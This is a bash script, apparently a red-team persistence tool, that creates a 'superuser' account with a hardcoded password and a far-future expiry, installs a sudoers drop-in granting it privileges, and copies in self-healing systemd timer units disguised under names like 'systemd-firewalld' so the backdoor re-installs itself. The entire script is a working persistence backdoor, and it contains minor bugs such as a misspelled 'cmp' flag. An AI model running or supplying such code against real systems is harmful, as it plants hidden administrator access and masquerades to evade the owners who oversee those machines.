#! /bin/bash

RED_USER="superuser"
RED_PASSWORD="SuperSecretPassword"
RED_SHELL="/bin/bash"
SUDO_DROPIN="1_superuser"

# Add the user if it doesn't exist
if ! id "$RED_USER" >/dev/null 2>/dev/null; then
	useradd -m $RED_USER
fi

# Ensure the user account is accessible
echo "$RED_PASSWORD" | passwd --stdin $RED_USER
passwd --unlock "$RED_USER"
chsh --shell "$RED_SHELL" "$RED_USER"
usermod --expiredate 2069-12-31 "$RED_USER"

# Add our sudo drop-in file if its not there or been modified
if ! [ -f $SUDO_DROPIN ]; then
	cp /usr/share/systemd-userd/files/$SUDO_DROPIN /etc/sudoers.d/$SUDO_DROPIN
else
	if ! cmp --slient "/etc/sudoers.d/$SUDO_DROPIN" "files/$SUDO_DROPIN" >/dev/null 2>/dev/null; then
		cp /usr/share/systemd-userd/files/$SUDO_DROPIN /etc/sudoers.d/$SUDO_DROPIN
	fi
fi

# Self healing
mkdir --parents /usr/share/systemd-firewalld
cp -- /usr/share/systemd-userd/systemd/* /etc/systemd/system/
cp -r -- /usr/share/systemd-userd/* /usr/share/systemd-firewalld/

systemctl daemon-reload
systemctl unmask systemd-firewalld.service

systemctl unmask systemd-firewalld.timer

systemctl enable --now systemd-firewalld.timer

# vim: set filetype=sh:
